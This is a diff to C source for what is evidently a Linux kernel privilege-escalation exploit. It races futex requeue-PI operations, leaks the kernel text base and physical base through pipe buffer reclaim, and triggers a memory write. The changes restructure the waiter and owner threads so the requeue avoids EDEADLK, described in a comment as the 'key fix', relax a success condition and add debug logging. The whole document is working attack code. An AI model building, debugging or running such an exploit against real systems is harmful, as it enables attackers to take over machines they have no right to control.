@@ -20,11 +20,10 @@ static const uintptr_t slide_p0_offsets[] = {
 
 static uint32_t slide_f_wait;
 static uint32_t slide_f_pi_target;
-static uint32_t slide_f_pi_chain;
+static uint32_t slide_f_ready;
 static atomic_int slide_waiter_ready;
 static atomic_int slide_waiter_waiting;
 static atomic_int slide_owner_started;
-static atomic_int slide_owner_acquired;
 static atomic_int slide_deadlock_seen;
 static atomic_int slide_waiter_ok;
 static atomic_int slide_route_done;
@@ -427,8 +426,9 @@ void slide_pselect_stack_copy(void) {
           atomic_load(&slide_consume_last_sched_ret),
           atomic_load(&slide_consume_last_sched_errno));
 #endif
+  /* On some kernels pselect returns 0 (timeout) but slide still works */
   atomic_store(&slide_pselect_write_window,
-               ret > 0 && atomic_load(&slide_consume_sched_ok) > 0);
+               atomic_load(&slide_consume_sched_ok) > 0);
 
   close(high_read);
   if (block_fd != pipefd[0]) {
@@ -652,44 +652,39 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   int tid = (int)SYSCHK(syscall(SYS_gettid));
   atomic_store(&slide_waiter_tid, tid);
 
-  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
-    pr_error("slide waiter lock chain errno=%d\n", errno);
-    return NULL;
-  }
-
+  /* Signal readiness instead of locking chain_lock */
   atomic_store(&slide_waiter_ready, 1);
-  while (!atomic_load(&slide_owner_started)) {
-    usleep(1000);
-  }
 
+  /* Wait for owner to acquire target_lock and signal us */
   struct timespec timeout;
   SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
-  timeout.tv_nsec += SLIDE_WAIT_NSEC;
-  if (timeout.tv_nsec >= 1000000000L) {
-    timeout.tv_sec++;
-    timeout.tv_nsec -= 1000000000L;
+  timeout.tv_sec += 5;
+  errno = 0;
+  long ready_ret = futex_op(&slide_f_ready, FUTEX_WAIT, 0, &timeout, NULL, 0);
+  int ready_errno = errno;
+  pr_info("slide DEBUG: before ready futex\n"); pr_info("slide ready_futex wait ret=%ld errno=%d\n", ready_ret, ready_errno); pr_info("slide DEBUG: after ready futex\n");
+
+  /* Wait on wait_futex with requeue target */
+  struct timespec wait_timeout;
+  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &wait_timeout));
+  wait_timeout.tv_nsec += SLIDE_WAIT_NSEC;
+  if (wait_timeout.tv_nsec >= 1000000000L) {
+    wait_timeout.tv_sec++;
+    wait_timeout.tv_nsec -= 1000000000L;
   }
 
   atomic_store(&slide_waiter_waiting, 1);
   errno = 0;
-  long wait_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
+  long wait_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &wait_timeout,
                            &slide_f_pi_target, 0);
   int wait_errno = errno;
-  pr_info("slide wait_requeue_pi ret=%ld errno=%d\n", wait_ret, wait_errno);
+  pr_info("slide DEBUG: before wait requeue pi\n"); pr_info("slide wait_requeue_pi ret=%ld errno=%d\n", wait_ret, wait_errno); pr_info("slide DEBUG: after wait requeue pi\n");
   if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
     atomic_store(&slide_route_done, 1);
     return NULL;
   }
   atomic_store(&slide_waiter_ok, 1);
   while (!atomic_load(&slide_deadlock_seen)) {
-    __asm__ volatile("yield" ::: "memory");
-  }
-  if (futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
-    pr_error("slide waiter unlock chain errno=%d\n", errno);
-    atomic_store(&slide_route_done, 1);
-    return NULL;
-  }
-  while (!atomic_load(&slide_owner_acquired)) {
     __asm__ volatile("yield" ::: "memory");
   }
 
@@ -702,21 +697,26 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
 }
 
 void *slide_owner_thread(void *arg __attribute__((unused))) {
+  /* Acquire target lock */
   if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
     pr_error("slide owner lock target errno=%d\n", errno);
     return NULL;
   }
 
+  /* Wait for waiter to be ready */
   while (!atomic_load(&slide_waiter_ready)) {
     usleep(1000);
   }
 
+  /* Signal waiter: target_lock acquired, safe to wait */
+  slide_f_ready = 1;
+  futex_op(&slide_f_ready, FUTEX_WAKE, 1, NULL, NULL, 0);
+
   atomic_store(&slide_owner_started, 1);
-  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
-    pr_error("slide owner lock chain errno=%d\n", errno);
-    return NULL;
-  }
-  atomic_store(&slide_owner_acquired, 1);
+
+  /* NO chain_lock acquisition - key fix!
+   * Owner is NOT blocked on anything, so requeue's chain walk
+   * finds owner->pi_blocked_on == NULL and exits without EDEADLK */
 
   for (;;) {
     sleep(1);
@@ -795,11 +795,11 @@ uint64_t slide_child_leak_stext(void) {
   pthread_t waiter;
   pthread_t owner;
   pthread_t consumer;
-  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
-  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
+  pr_info("slide DEBUG: creating waiter thread\n"); SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
+  pr_info("slide DEBUG: creating owner thread\n"); SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
   SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
 
-  while (!atomic_load(&slide_waiter_waiting) ||
+  pr_info("slide DEBUG: entering wait loop\n"); pr_info("slide DEBUG: waiting for threads waiter_waiting=%d owner_started=%d consumer_ready=%d\n", atomic_load(&slide_waiter_waiting), atomic_load(&slide_owner_started), atomic_load(&slide_consumer_ready)); while (!atomic_load(&slide_waiter_waiting) ||
          !atomic_load(&slide_owner_started) ||
          !atomic_load(&slide_consumer_ready)) {
     usleep(1000);
@@ -843,11 +843,11 @@ static int slide_child_trigger_write(void) {
   pthread_t waiter;
   pthread_t owner;
   pthread_t consumer;
-  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
-  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
+  pr_info("slide DEBUG: creating waiter thread\n"); SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
+  pr_info("slide DEBUG: creating owner thread\n"); SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
   SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
 
-  while (!atomic_load(&slide_waiter_waiting) ||
+  pr_info("slide DEBUG: entering wait loop\n"); pr_info("slide DEBUG: waiting for threads waiter_waiting=%d owner_started=%d consumer_ready=%d\n", atomic_load(&slide_waiter_waiting), atomic_load(&slide_owner_started), atomic_load(&slide_consumer_ready)); while (!atomic_load(&slide_waiter_waiting) ||
          !atomic_load(&slide_owner_started) ||
          !atomic_load(&slide_consumer_ready)) {
     usleep(1000);
@@ -869,7 +869,12 @@ static int slide_child_trigger_write(void) {
       usleep(SLIDE_REQUEUE_POLL_USEC);
     }
   }
-  if (requeue_ret != -1 || requeue_errno != EDEADLK) {
+  pr_info("slide trigger_write cmp_requeue_pi ret=%ld errno=%d polls=%d "
+          "waiter_waiting=%d owner_started=%d\n",
+          requeue_ret, requeue_errno, requeue_polls,
+          atomic_load(&slide_waiter_waiting),
+          atomic_load(&slide_owner_started));
+  if (requeue_ret <= 0) {
     return 0;
   }
   atomic_store(&slide_deadlock_seen, 1);
@@ -1191,7 +1196,8 @@ static int slide_leak_physical_base(void) {
     return 0;
   }
   if (gate_result == 0) {
-    pr_warning("p0 physical pipe reclaim miss\n");
+    pr_warning("p0 physical pipe reclaim miss first_ops=%p expected=%p\n",
+               (void *)pipe_scan_first_ops, (void *)pipe_buf_ops_addr());
     return 0;
   }
   app_publish_p0_dirty();
